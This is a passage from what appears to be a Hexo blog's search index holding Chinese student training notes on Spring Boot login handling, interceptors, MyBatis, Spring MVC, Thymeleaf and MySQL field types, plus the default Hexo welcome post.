class-name">LoginException</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">,</span> <span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCode</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> code<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>code <span class="token operator">=</span> code<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>msg <span class="token operator">=</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在服务中抛出异常"><a href="#在服务中抛出异常" class="headerlink" title="在服务中抛出异常"></a>在服务中抛出异常</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">LoginService</span> <span class="token punctuation">&#123;</span>        <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">AdminMapper</span> mapper<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span>  <span class="token class-name">JsonData</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token class-name">Admin</span> admin<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//数据校验</span>                <span class="token comment">//从数据库中查数据</span>        <span class="token class-name">Admin</span> dbAdmin <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">findoneByName</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span><span class="token function">getAdminName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dbAdmin <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//说明用户不存在</span><span class="token comment">//            return new JsonData(1001,"用户不存在");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token number">1001</span><span class="token punctuation">,</span><span class="token string">"用户不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">//判断状态</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">.</span><span class="token function">getAdminStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">.</span><span class="token function">getAdminStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//            return new JsonData(1001,"用户被锁定,联系管理员");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token number">1002</span><span class="token punctuation">,</span><span class="token string">"用户被锁定,联系管理员"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">//判断密码正确</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dbAdmin<span class="token punctuation">.</span><span class="token function">getAdminPwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span><span class="token function">getAdminPwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//            return new JsonData(1001,"密码错误");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token number">1003</span><span class="token punctuation">,</span><span class="token string">"密码错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//存到session</span>        session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"adminName"</span><span class="token punctuation">,</span>admin<span class="token punctuation">.</span><span class="token function">getAdminName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//更新用户最后登录时间</span>        dbAdmin<span class="token punctuation">.</span><span class="token function">setLastLoginTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Timestamp</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//dbAdmin没有问题</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JsonData</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"登录正常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span>  <span class="token class-name">JsonData</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invalidate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JsonData</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"退出正常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Spring拦截器"><a href="#Spring拦截器" class="headerlink" title="Spring拦截器"></a>Spring拦截器</h2><p>应用的例子：在用户没有登录的时候，无法进入系统中的其他页面。</p><p>原理：<br>对每一个请求进行审查，如果满足要求，则放行；不满足要求，重定向到其他页面。<br><strong>需要注意的是，要严格审查逻辑，放行登录页面和静态资源，不要产生无限循环的情况。</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210605103735.png" alt="20210605103735"></p><h3 id="登录拦截器"><a href="#登录拦截器" class="headerlink" title="登录拦截器"></a>登录拦截器</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 登录拦截器 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">HandlerInterceptor</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 前置方法     * @param request     * @param response     * @param handler     * @return     * @throws Exception     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">preHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//判断是否登录</span>        <span class="token comment">//判断session</span>        <span class="token comment">//没有登录重定向到登录页面、登录了，定向到index页面</span>        <span class="token comment">//先去获取session对象</span>        <span class="token class-name">HttpSession</span> session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取登录的标记</span>        <span class="token class-name">String</span> adminName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"adminName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//判断session的值是否为null</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>adminName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//如果没有登录，这里就产生了循环，因为默认是拦截所有请求，所以就变成了无限次的重定向，</span>            <span class="token comment">//浏览器出现了too many redirect</span>            response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"/login/page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token comment">//false拦截、true放行</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 后置方法     * @param request     * @param response     * @param handler     * @param modelAndView     * @throws Exception     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postHandle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">ModelAndView</span> modelAndView<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterCompletion</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">,</span> <span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注册拦截器"><a href="#注册拦截器" class="headerlink" title="注册拦截器"></a>注册拦截器</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SystemConfig</span> <span class="token keyword">implements</span> <span class="token class-name">WebMvcConfigurer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 专门用来注册拦截器的     * @param registry     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addInterceptors</span><span class="token punctuation">(</span><span class="token class-name">InterceptorRegistry</span> registry<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        registry<span class="token punctuation">.</span><span class="token function">addInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LoginInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token comment">//拦截所有的请求</span>                <span class="token punctuation">.</span><span class="token function">addPathPatterns</span><span class="token punctuation">(</span><span class="token string">"/**"</span><span class="token punctuation">)</span>                <span class="token comment">//放行方法</span>                <span class="token punctuation">.</span><span class="token function">excludePathPatterns</span><span class="token punctuation">(</span><span class="token string">"/login/**"</span><span class="token punctuation">)</span>                <span class="token comment">//放行css</span>                <span class="token punctuation">.</span><span class="token function">excludePathPatterns</span><span class="token punctuation">(</span><span class="token string">"/static/**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 国信安实训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训day4</title>
      <link href="/2021/06/03/shi-xun-day4/"/>
      <url>/2021/06/03/shi-xun-day4/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#spring%E5%85%A5%E9%97%A83">Spring入门3</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF-mybatis">什么是 MyBatis</a><ul><li><a href="#%E5%8E%9F%E7%90%86%E5%9B%BE">原理图</a></li><li><a href="#mtbatis%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2">MtBatis进行数据查询</a></li></ul></li><li><a href="#springboot%E6%9F%A5%E6%89%BE%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E9%A1%BA%E5%BA%8F">SpringBoot查找静态资源的顺序</a></li><li><a href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E7%B1%BB%E5%9E%8Bvarchar%E5%92%8Cchar%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%E5%93%AA%E7%A7%8D%E5%AD%97%E6%AE%B5%E7%9A%84%E6%9F%A5%E6%89%BE%E6%95%88%E7%8E%87%E8%A6%81%E9%AB%98%E4%B8%BA%E4%BB%80%E4%B9%88">MySQL数据库中的字段类型varchar和char的主要区别是什么？哪种字段的查找效率要高，为什么</a></li></ul></li></ul><h1 id="Spring入门3"><a href="#Spring入门3" class="headerlink" title="Spring入门3"></a>Spring入门3</h1><p>Java体系操作数据库的框架：</p><ul><li>全ORM: Hibernate，JPA 完全隔离sql语句，不写sql即可实现相应的数据库操作。相对半ORM来说执行速度会慢一点。</li><li>半ORM：Mybatis 隔离sql和java语句，java和 sql是分开的。更适合web项目的开发</li></ul><h2 id="什么是-MyBatis"><a href="#什么是-MyBatis" class="headerlink" title="什么是 MyBatis"></a>什么是 MyBatis</h2><p>MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录。</p><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210603114409.png" alt="20210603114409"></p><h3 id="MtBatis进行数据查询"><a href="#MtBatis进行数据查询" class="headerlink" title="MtBatis进行数据查询"></a>MtBatis进行数据查询</h3><ul><li>导入依赖 maven包</li><li>配置数据源 确定数据库的类型、账号、密码</li><li>Mybatis相关文件的创建</li></ul><p>1.创建实体类<br>数据库中的表 — 类<br>数据库表中的字段  — 类属性<br>数据            – 对象<br>2.创建接口 AdminMapper<br>3.创建对应的映射文件 Xml<br>4.配置mybatis 指定映射文件的位置、打印sql语句等<br>5.扫描接口  在启动类上面扫描<br>6.单元测试 去test目录下的Tests进行</p><h2 id="SpringBoot查找静态资源的顺序"><a href="#SpringBoot查找静态资源的顺序" class="headerlink" title="SpringBoot查找静态资源的顺序"></a>SpringBoot查找静态资源的顺序</h2><p>先从resources &gt; static &gt; public<br>如果在这几个文件夹中任意一个文件中找到静态资源，就不会再去其他的文件夹查找。都没有，就会直接抛出404.</p><h2 id="MySQL数据库中的字段类型varchar和char的主要区别是什么？哪种字段的查找效率要高，为什么"><a href="#MySQL数据库中的字段类型varchar和char的主要区别是什么？哪种字段的查找效率要高，为什么" class="headerlink" title="MySQL数据库中的字段类型varchar和char的主要区别是什么？哪种字段的查找效率要高，为什么"></a>MySQL数据库中的字段类型varchar和char的主要区别是什么？哪种字段的查找效率要高，为什么</h2><p><strong>区别一，定长和变长</strong><br>char 表示定长，长度固定，varchar表示变长，即长度可变，当所插入的字符串超出它们的长度时，视情况来处理，如果是严格模式，则会拒绝插入并提示错误信息，如果是宽松模式，则会截取然后插入。如果插入的字符串长度小于定义长度时，则会以不同的方式来处理，如char（10），表示存储的是10个字符，无论你插入的是多少，都是10个，如果少于10个，则用空格填满。而varchar（10），小于10个的话，则插入多少个字符就存多少个。varchar怎么知道所存储字符串的长度呢？实际上，对于varchar 字段来说，需要使用一个（如果字符串长度小于255）或两个字节（长度大于255）来存储字符串的长度。<br><strong>区别之二</strong><br>存储的容量不同对char来说，最多能存放的字符个数 255，和编码无关。而varchar呢，最多能存放 65532 个字符。VARCHAR的最大有效长度由最大行大小和使用的字符集确定。整体最大长度是65,532 字节，最大有效长度是 65532 字节，在varchar存字符串的时候，第一个字节是空的，不存任何的数据，然后还需要两个字节来存放字符串的长度。所以有效长度就是 65535 - 1 - 2= 65532</p>]]></content>
      
      
      <categories>
          
          <category> 国信安实训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训day3</title>
      <link href="/2021/06/02/shi-xun-day3/"/>
      <url>/2021/06/02/shi-xun-day3/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#spring%E5%85%A5%E9%97%A82">Spring入门2</a><ul><li><a href="#mvc%E6%A8%A1%E5%BC%8Fmodeviewcontroller">MVC模式(mode\view\controller)</a><ul><li><a href="#mvc%E5%8E%9F%E7%90%86%E5%9B%BE">MVC原理图</a></li></ul></li><li><a href="#springmvc%E6%98%AF%E4%BB%80%E4%B9%88">springMVC是什么</a><ul><li><a href="#%E5%8E%9F%E7%90%86%E5%9B%BE">原理图</a></li></ul></li><li><a href="#spring-thymeleaf">spring thymeleaf</a><ul><li><a href="#%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB">动静分离</a></li></ul></li><li><a href="#spring%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91">Spring接口开发</a><ul><li><a href="#%E7%B1%BB%E4%B8%8A%E7%9A%84%E6%B3%A8%E8%A7%A3">类上的注解</a></li><li><a href="#%E6%96%B9%E6%B3%95%E4%B8%8A%E7%9A%84%E6%B3%A8%E8%A7%A3">方法上的注解</a></li><li><a href="#%E5%8F%82%E6%95%B0%E6%B3%A8%E8%A7%A3">参数注解</a></li></ul></li></ul></li></ul><h1 id="Spring入门2"><a href="#Spring入门2" class="headerlink" title="Spring入门2"></a>Spring入门2</h1><h2 id="MVC模式-mode-view-controller"><a href="#MVC模式-mode-view-controller" class="headerlink" title="MVC模式(mode\view\controller)"></a>MVC模式(mode\view\controller)</h2><p>详见博客 <a href="https://www.cnblogs.com/xiaoxi/p/6164383.html">https://www.cnblogs.com/xiaoxi/p/6164383.html</a></p><h3 id="MVC原理图"><a href="#MVC原理图" class="headerlink" title="MVC原理图"></a>MVC原理图</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210602172050.png" alt="20210602172050"></p><p>M-Model 模型（完成业务逻辑：有javaBean构成，service+dao+entity）</p><p>V-View 视图（做界面的展示  jsp，html……）</p><p>C-Controller 控制器（接收请求—&gt;调用模型—&gt;根据结果派发页面）</p><h2 id="springMVC是什么"><a href="#springMVC是什么" class="headerlink" title="springMVC是什么"></a>springMVC是什么</h2><p>　　springMVC是一个MVC的开源框架，springMVC=struts2+spring，springMVC就相当于是Struts2加上sring的整合，但是这里有一个疑惑就是，springMVC和spring是什么样的关系呢？这个在百度百科上有一个很好的解释：意思是说，springMVC是spring的一个后续产品，其实就是spring在原有基础上，又提供了web应用的MVC模块，可以简单的把springMVC理解为是spring的一个模块（类似AOP，IOC这样的模块），网络上经常会说springMVC和spring无缝集成，其实springMVC就是spring的一个子模块，所以根本不需要同spring进行整合。</p><h3 id="原理图"><a href="#原理图" class="headerlink" title="原理图"></a>原理图</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210602172227.png" alt="20210602172227"></p><p>第一步:用户发起请求到前端控制器（DispatcherServlet）</p><p>第二步：前端控制器请求处理器映射器（HandlerMappering）去查找处理器（Handle）：通过xml配置或者注解进行查找</p><p>第三步：找到以后处理器映射器（HandlerMappering）像前端控制器返回执行链（HandlerExecutionChain）</p><p>第四步：前端控制器（DispatcherServlet）调用处理器适配器（HandlerAdapter）去执行处理器（Handler）</p><p>第五步：处理器适配器去执行Handler</p><p>第六步：Handler执行完给处理器适配器返回ModelAndView</p><p>第七步：处理器适配器向前端控制器返回ModelAndView</p><p>第八步：前端控制器请求视图解析器（ViewResolver）去进行视图解析</p><p>第九步：视图解析器像前端控制器返回View</p><p>第十步：前端控制器对视图进行渲染</p><p>第十一步：前端控制器向用户响应结果</p><h2 id="spring-thymeleaf"><a href="#spring-thymeleaf" class="headerlink" title="spring thymeleaf"></a>spring thymeleaf</h2><p>详见 <a href="https://developer.aliyun.com/article/769977">https://developer.aliyun.com/article/769977</a></p><p>模板引擎在web领域的主要作用：让网站实现界面和数据分离，这样大大提高了开发效率，让代码重用更加容易。</p><h3 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h3><p>对于传统jsp或者其他模板来说，没有一个模板引擎的后缀为.html，就拿jsp来说jsp的后缀为.jsp,它的本质就是将一个html文件修改后缀为.jsp，然后在这个文件中增加自己的语法、标签然后执行时候通过后台处理这个文件最终返回一个html页面。</p><p>浏览器无法直接识别.jsp文件，需要借助网络(服务端)才能进行访问；而Thymeleaf用html做模板可以直接在浏览器中打开。开发者充分考虑html页面特性，将Thymeleaf的语法通过html的标签属性来定义完成，这些标签属性不会影响html页面的完整性和显示。如果通过后台服务端访问页面服务端会寻找这些标签将服务端对应的数据替换到相应位置实现动态页面！大体区别可以参照下图</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210602173047.png" alt="20210602173047"></p><p>上图的意思就是如果直接打开这个html那么浏览器会对th等标签忽视而显示原始的内容。如果通过服务端访问那么服务端将先寻找th标签将服务端储存的数据替换到对应位置。具体效果可以参照下图,下图即为一个动静结合的实例。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210602173204.png" alt="20210602173204"></p><h2 id="Spring接口开发"><a href="#Spring接口开发" class="headerlink" title="Spring接口开发"></a>Spring接口开发</h2><p>做如下区分的目的：方便后续代码的扩展和维护</p><h3 id="类上的注解"><a href="#类上的注解" class="headerlink" title="类上的注解"></a>类上的注解</h3><p>Stererotype.Component标记Spring中普通组件<br>Stererotype.Controller 控制器<br>Stererotype.Service服务层对象、处理业务逻辑<br>Stererotype. Repository持久层对象、操作数据库<br>Web.bin.annotation.RestController web控制器，返回json数据</p><h3 id="方法上的注解"><a href="#方法上的注解" class="headerlink" title="方法上的注解"></a>方法上的注解</h3><p>@RequsetMapping 路由控制返回数据<br>@GetMapping get请求获取用户数据<br>@PostMapping 获取数据<br>@PutMapping 更新数据<br>@DeleteMapping 删除数据</p><h3 id="参数注解"><a href="#参数注解" class="headerlink" title="参数注解"></a>参数注解</h3><p>@RequestParam required参数是否必传、name别名(前端看到的)、defaultValue:默认值 (这个name很奇怪，不知道怎么用的)</p>]]></content>
      
      
      <categories>
          
          <category> 国信安实训 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/06/01/hello-world/"/>
      <url>/2021/06/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实训day1-day2</title>
      <link href="/2021/06/01/shi-xun-day1-day2/"/>
      <url>/2021/06/01/shi-xun-day1-day2/</url>
      
